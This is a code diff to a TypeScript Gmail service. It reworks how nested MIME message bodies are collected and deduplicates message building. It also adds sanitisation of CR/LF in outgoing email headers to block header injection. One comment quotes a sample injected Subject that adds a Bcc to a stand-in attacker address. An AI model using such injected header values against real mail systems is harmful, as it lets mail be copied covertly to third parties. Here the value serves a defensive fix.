@@ -41,40 +41,34 @@ export interface SendEmailOptions {
 }
 
 interface MessageBodies {
+  // Every text/plain segment, joined.
   text?: string;
+  // The first text/html part.
   html?: string;
+  // The first other text/* subtype (text/calendar, Apple Mail's
+  // text/watch-html), used only when there is nothing better.
+  other?: string;
 }
 
-// Gmail nests bodies arbitrarily deep: a mail with an attachment is
-// multipart/mixed > multipart/alternative > text/html, so scanning only
-// payload.parts finds a multipart container, never the text, and the body
-// comes back empty. Where it did match, `find` hit text/plain first and the
-// HTML alternative was dropped entirely. Walk the whole tree and keep both.
-const collectBodies = (
-  part: gmail_v1.Schema$MessagePart | undefined,
-  found: MessageBodies = {}
-): MessageBodies => {
-  if (!part) {
-    return found;
-  }
+// Header values are interpolated into a raw RFC 822 message, so a CR or LF in
+// one lets the caller inject arbitrary extra headers. replyToEmail feeds this
+// a Subject and From read straight out of the inbox, which makes the sender of
+// an inbound mail the attacker: "Hi\r\nBcc: attacker@evil.com" would silently
+// blind-copy the reply.
+const headerValue = (value: string): string =>
+  value.replace(/[\r\n]+/g, " ").trim();
 
-  const data = part.body?.data;
-  if (data) {
-    // base64url: Gmail encodes with - and _, which the plain base64 alphabet
-    // does not cover.
-    const decoded = Buffer.from(data, "base64url").toString("utf-8");
-    if (part.mimeType === "text/html") {
-      found.html ??= decoded;
-    } else if (part.mimeType === "text/plain" || !part.mimeType) {
-      found.text ??= decoded;
-    }
+// Which collected body to hand back as `body`. A plain-text alternative that
+// is only whitespace is a placeholder, not content - treating it as the body
+// is what leaves newsletters looking empty.
+const preferredBody = (bodies: MessageBodies, includeHtml: boolean): string => {
+  if (bodies.text?.trim()) {
+    return bodies.text;
   }
-
-  for (const child of part.parts || []) {
-    collectBodies(child, found);
+  if (includeHtml && bodies.html) {
+    return bodies.html;
   }
-
-  return found;
+  return bodies.other ?? bodies.text ?? "";
 };
 
 export class GmailService {
@@ -82,6 +76,99 @@ export class GmailService {
 
   constructor(authClient: Auth.OAuth2Client) {
     this.gmail = google.gmail({ version: "v1", auth: authClient });
+  }
+
+  // Gmail nests bodies arbitrarily deep: a mail with an attachment is
+  // multipart/mixed > multipart/alternative > text/html, so scanning only
+  // payload.parts finds a multipart container, never the text, and the body
+  // comes back empty. Where it did match, `find` hit text/plain first and the
+  // HTML alternative was dropped entirely. Walk the whole tree and keep both.
+  //
+  // Iterative, not recursive: the tree shape comes straight from inbound mail,
+  // so a deeply nested message would otherwise blow the call stack with a
+  // RangeError instead of failing the way the rest of this service does.
+  private collectBodies(
+    root: gmail_v1.Schema$MessagePart | undefined
+  ): MessageBodies {
+    const found: MessageBodies = {};
+    const plain: string[] = [];
+    const stack: gmail_v1.Schema$MessagePart[] = root ? [root] : [];
+
+    while (stack.length > 0) {
+      const part = stack.pop();
+      if (!part) {
+        continue;
+      }
+
+      // MIME types are case-insensitive (RFC 2045 5.1). Lowercase once, up
+      // front, so every check below agrees on the spelling.
+      const mimeType = part.mimeType?.toLowerCase();
+
+      // A forwarded .eml is a whole message of its own; its text would
+      // otherwise be handed back as this message's body.
+      if (mimeType === "message/rfc822") {
+        continue;
+      }
+
+      // An attachment is not the body - but it can still be a container, so
+      // skip only the recording and keep walking its children.
+      const data = part.body?.data;
+      if (data && !part.filename) {
+        const decoded = Buffer.from(data, "base64url").toString("utf-8");
+        if (mimeType === "text/html") {
+          found.html ??= decoded;
+        } else if (!mimeType || mimeType === "text/plain") {
+          plain.push(decoded);
+        } else if (mimeType.startsWith("text/")) {
+          // text/calendar, text/enriched, text/watch-html: still body content,
+          // where a non-text part with inline data (an inline image) is not.
+          found.other ??= decoded;
+        }
+      }
+
+      // Reversed, so a LIFO stack still visits siblings in document order -
+      // MIME lists alternatives simplest-first and we keep the first of each.
+      const children = part.parts || [];
+      for (let i = children.length - 1; i >= 0; i--) {
+        stack.push(children[i]);
+      }
+    }
+
+    if (plain.length > 0) {
+      // Mail split around an inline image, or prefixed with an external-sender
+      // banner, arrives as several sibling text parts. The body is all of them
+      // - keeping only the first returns the banner and drops the message.
+      found.text = plain.join("\n\n");
+    }
+
+    return found;
+  }
+
+  // getMessage and getThread built this literal separately and had already
+  // drifted apart; one copy keeps them honest.
+  private toMessage(
+    msg: gmail_v1.Schema$Message,
+    options: { includeHtml?: boolean } = {}
+  ): GmailMessage {
+    const includeHtml = options.includeHtml !== false;
+    const headers = msg.payload?.headers || [];
+    const getHeader = (name: string): string | null | undefined =>
+      headers.find((h) => h.name?.toLowerCase() === name.toLowerCase())?.value;
+    const bodies = this.collectBodies(msg.payload);
+
+    return {
+      id: msg.id || "",
+      threadId: msg.threadId || "",
+      labelIds: msg.labelIds || undefined,
+      snippet: msg.snippet || undefined,
+      subject: getHeader("Subject") || undefined,
+      from: getHeader("From") || undefined,
+      to: getHeader("To") || undefined,
+      date: getHeader("Date") || undefined,
+      body: preferredBody(bodies, includeHtml),
+      bodyHtml: includeHtml ? bodies.html : undefined,
+      isUnread: msg.labelIds?.includes("UNREAD"),
+    };
   }
 
   // Profile
@@ -149,7 +236,10 @@ export class GmailService {
     const messages: GmailMessage[] = [];
     for (const msg of response.data.messages || []) {
       if (msg.id) {
-        const fullMsg = await this.getMessage(msg.id);
+        // One full HTML document per result would put megabytes of newsletter
+        // markup in a single tool response, so list results carry no HTML in
+        // either field; `snippet` is there for HTML-only mail.
+        const fullMsg = await this.getMessage(msg.id, { includeHtml: false });
         messages.push(fullMsg);
       }
     }
@@ -160,45 +250,30 @@ export class GmailService {
     };
   }
 
-  public async getMessage(messageId: string): Promise<GmailMessage> {
+  public async getMessage(
+    messageId: string,
+    options: { includeHtml?: boolean } = {}
+  ): Promise<GmailMessage> {
     const response = await this.gmail.users.messages.get({
       userId: "me",
       id: messageId,
       format: "full",
     });
 
-    const headers = response.data.payload?.headers || [];
-    const getHeader = (name: string): string | null | undefined =>
-      headers.find((h) => h.name?.toLowerCase() === name.toLowerCase())?.value;
-
-    const bodies = collectBodies(response.data.payload);
-
-    return {
-      id: response.data.id || "",
-      threadId: response.data.threadId || "",
-      labelIds: response.data.labelIds || undefined,
-      snippet: response.data.snippet || undefined,
-      subject: getHeader("Subject") || undefined,
-      from: getHeader("From") || undefined,
-      to: getHeader("To") || undefined,
-      date: getHeader("Date") || undefined,
-      body: bodies.text ?? bodies.html ?? "",
-      bodyHtml: bodies.html,
-      isUnread: response.data.labelIds?.includes("UNREAD"),
-    };
+    return this.toMessage(response.data, options);
   }
 
   public async sendEmail(options: SendEmailOptions): Promise<GmailMessage> {
     const messageParts = [
-      `To: ${options.to}`,
-      `Subject: ${options.subject}`,
+      `To: ${headerValue(options.to)}`,
+      `Subject: ${headerValue(options.subject)}`,
     ];
 
     if (options.cc) {
-      messageParts.push(`Cc: ${options.cc}`);
+      messageParts.push(`Cc: ${headerValue(options.cc)}`);
     }
     if (options.bcc) {
-      messageParts.push(`Bcc: ${options.bcc}`);
+      messageParts.push(`Bcc: ${headerValue(options.bcc)}`);
     }
 
     if (options.isHtml) {
@@ -347,28 +422,9 @@ export class GmailService {
       format: "full",
     });
 
-    const messages: GmailMessage[] = [];
-    for (const msg of response.data.messages || []) {
-      const headers = msg.payload?.headers || [];
-      const getHeader = (name: string): string | null | undefined =>
-        headers.find((h) => h.name?.toLowerCase() === name.toLowerCase())?.value;
-
-      const bodies = collectBodies(msg.payload);
-
-      messages.push({
-        id: msg.id || "",
-        threadId: msg.threadId || "",
-        labelIds: msg.labelIds || undefined,
-        snippet: msg.snippet || undefined,
-        subject: getHeader("Subject") || undefined,
-        from: getHeader("From") || undefined,
-        to: getHeader("To") || undefined,
-        date: getHeader("Date") || undefined,
-        body: bodies.text ?? bodies.html ?? "",
-        bodyHtml: bodies.html,
-        isUnread: msg.labelIds?.includes("UNREAD"),
-      });
-    }
+    const messages = (response.data.messages || []).map((msg) =>
+      this.toMessage(msg)
+    );
 
     return {
       id: response.data.id || "",
